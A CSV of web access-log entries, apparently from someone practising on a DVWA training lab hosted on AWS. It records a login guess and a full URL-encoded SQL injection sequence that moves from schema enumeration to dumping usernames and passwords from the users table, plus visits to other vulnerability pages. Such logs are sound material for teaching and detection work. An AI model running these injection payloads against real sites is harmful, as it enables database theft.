timestamp,message
1618840927186,"{ ""time"":""2021-04-19T14:02:02.397Z"", ""process"":""1447"", ""filename"":""/var/www/html/DVWA/vulnerabilities/brute/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/brute/index.php"", ""query"":"""",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/index.php""}"
1618840933186,"{ ""time"":""2021-04-19T14:02:08.494Z"", ""process"":""1890"", ""filename"":""/var/www/html/DVWA/vulnerabilities/brute/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/brute/index.php"", ""query"":""?username=admin&password=12345&Login=Login"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/brute/""}"
1618840937182,"{ ""time"":""2021-04-19T14:02:14.309Z"", ""process"":""4635"", ""filename"":""/var/www/html/DVWA/vulnerabilities/exec/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/exec/index.php"", ""query"":"""",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/brute/?username=admin&password=12345&Login=Login""}"
1618840941186,"{ ""time"":""2021-04-19T14:02:17.000Z"", ""process"":""6875"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":"""",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/exec/""}"
1618840981186,"{ ""time"":""2021-04-19T14:02:56.262Z"", ""process"":""2022"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/""}"
1618841000186,"{ ""time"":""2021-04-19T14:03:15.408Z"", ""process"":""2855"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1%27&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/?id=1&Submit=Submit""}"
1618841027186,"{ ""time"":""2021-04-19T14:03:42.982Z"", ""process"":""1756"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1%27+order+by+1+%23&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/?id=1&Submit=Submit""}"
1618841061186,"{ ""time"":""2021-04-19T14:04:16.145Z"", ""process"":""1873"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1%27+union+select+1%2C2+%23&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/?id=1%27+order+by+1+%23&Submit=Submit""}"
1618841079186,"{ ""time"":""2021-04-19T14:04:34.625Z"", ""process"":""5417"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1%27+union+select+null%2Cdatabase%28%29+%23&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/?id=1%27+union+select+1%2C2+%23&Submit=Submit""}"
1618841094186,"{ ""time"":""2021-04-19T14:04:50.002Z"", ""process"":""1965"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1%27+union+select+null%2Cuser%28%29+%23&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/?id=1%27+union+select+null%2Cdatabase%28%29+%23&Submit=Submit""}"
1618841107186,"{ ""time"":""2021-04-19T14:05:02.987Z"", ""process"":""2617"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1%27+union+select+null%2Ctable_name+from+information_schema.tables+%23&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/?id=1%27+union+select+null%2Cuser%28%29+%23&Submit=Submit""}"
1618841128186,"{ ""time"":""2021-04-19T14:05:23.545Z"", ""process"":""2830"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1%27+union+select+null%2Ctable_name+from+information_schema.tables+where+table_name+like+%27user%25%27%23&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/?id=1%27+union+select+null%2Ctable_name+from+information_schema.tables+%23&Submit=Submit""}"
1618841142186,"{ ""time"":""2021-04-19T14:05:37.717Z"", ""process"":""2260"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1%27+union+select+null%2Cconcat%28table_name%2C0x0a%2Ccolumn_name%29+from+information_schema.columns+where+table_name%3D%27users%27+%23&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/?id=1%27+union+select+null%2Ctable_name+from+information_schema.tables+where+table_name+like+%27user%25%27%23&Submit=Submit""}"
1618841164186,"{ ""time"":""2021-04-19T14:05:59.493Z"", ""process"":""1955"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1%27+union+select+null%2C+concat%28user_id%2C0x0a%2Cfirst_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29+from+users+%23&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/?id=1%27+union+select+null%2Cconcat%28table_name%2C0x0a%2Ccolumn_name%29+from+information_schema.columns+where+table_name%3D%27users%27+%23&Submit=Submit""}"
1618841193186,"{ ""time"":""2021-04-19T14:06:28.509Z"", ""process"":""1739"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1%27+or+1%3D1+%23&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/?id=1%27+union+select+null%2C+concat%28user_id%2C0x0a%2Cfirst_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29+from+users+%23&Submit=Submit""}"
1618841316186,"{ ""time"":""2021-04-19T14:08:31.842Z"", ""process"":""3764"", ""filename"":""/var/www/html/DVWA/vulnerabilities/upload/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/upload/index.php"", ""query"":"""",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/?id=1%27+or+1%3D1+%23&Submit=Submit""}"
1618841358186,"{ ""time"":""2021-04-19T14:09:13.925Z"", ""process"":""847"", ""filename"":""/var/www/html/DVWA/security.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/security.php"", ""query"":"""",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/upload/""}"
1618841358736,"{ ""time"":""2021-04-19T14:09:18.299Z"", ""process"":""532"", ""filename"":""/var/www/html/DVWA/security.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/security.php"", ""query"":"""",""method"":""POST"", ""status"":""302"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/security.php""}"
1618841363186,"{ ""time"":""2021-04-19T14:09:18.509Z"", ""process"":""896"", ""filename"":""/var/www/html/DVWA/security.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/security.php"", ""query"":"""",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/security.php""}"
1618841431041,"{ ""time"":""2021-04-19T14:10:27.244Z"", ""process"":""6017"", ""filename"":""/var/www/html/DVWA/vulnerabilities/fi/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/fi/index.php"", ""query"":""?page=include.php"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/security.php""}"
1618841435186,"{ ""time"":""2021-04-19T14:10:30.992Z"", ""process"":""4962"", ""filename"":""/var/www/html/DVWA/vulnerabilities/csrf/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/csrf/index.php"", ""query"":"""",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/fi/?page=include.php""}"
1618841442186,"{ ""time"":""2021-04-19T14:10:37.790Z"", ""process"":""2616"", ""filename"":""/var/www/html/DVWA/vulnerabilities/exec/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/exec/index.php"", ""query"":"""",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/csrf/""}"
1618841532186,"{ ""time"":""2021-04-19T14:12:04.307Z"", ""process"":""3062756"", ""filename"":""/var/www/html/DVWA/vulnerabilities/exec/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/exec/index.php"", ""query"":"""",""method"":""POST"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/exec/""}"
1618841547186,"{ ""time"":""2021-04-19T14:12:19.293Z"", ""process"":""3052595"", ""filename"":""/var/www/html/DVWA/vulnerabilities/exec/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/exec/index.php"", ""query"":"""",""method"":""POST"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/exec/""}"
1618841566139,"{ ""time"":""2021-04-19T14:12:41.859Z"", ""process"":""826"", ""filename"":""/var/www/html/DVWA/security.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/security.php"", ""query"":"""",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/exec/""}"
1618841566139,"{ ""time"":""2021-04-19T14:12:45.915Z"", ""process"":""515"", ""filename"":""/var/www/html/DVWA/security.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/security.php"", ""query"":"""",""method"":""POST"", ""status"":""302"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/security.php""}"
1618841568640,"{ ""time"":""2021-04-19T14:12:46.135Z"", ""process"":""934"", ""filename"":""/var/www/html/DVWA/security.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/security.php"", ""query"":"""",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/security.php""}"
1618841573186,"{ ""time"":""2021-04-19T14:12:48.615Z"", ""process"":""1514"", ""filename"":""/var/www/html/DVWA/vulnerabilities/exec/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/exec/index.php"", ""query"":"""",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/security.php""}"
1618841580189,"{ ""time"":""2021-04-19T14:12:52.425Z"", ""process"":""3072561"", ""filename"":""/var/www/html/DVWA/vulnerabilities/exec/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/exec/index.php"", ""query"":"""",""method"":""POST"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/exec/""}"
1618841597186,"{ ""time"":""2021-04-19T14:13:09.942Z"", ""process"":""3060702"", ""filename"":""/var/www/html/DVWA/vulnerabilities/exec/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/exec/index.php"", ""query"":"""",""method"":""POST"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/exec/""}"
1618841646186,"{ ""time"":""2021-04-19T14:14:01.518Z"", ""process"":""46"", ""filename"":""-"", ""remoteIP"":""91.195.99.178"", ""host"":""ip-172-31-8-208.us-east-2.compute.internal"", ""request"":""-"", ""query"":"""",""method"":""-"", ""status"":""408"", ""userAgent"":""-"",""referer"":""-""}"
1618841757186,"{ ""time"":""2021-04-19T14:15:52.237Z"", ""process"":""10445"", ""filename"":""/var/www/html/DVWA/vulnerabilities/captcha/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/captcha/index.php"", ""query"":"""",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/exec/""}"
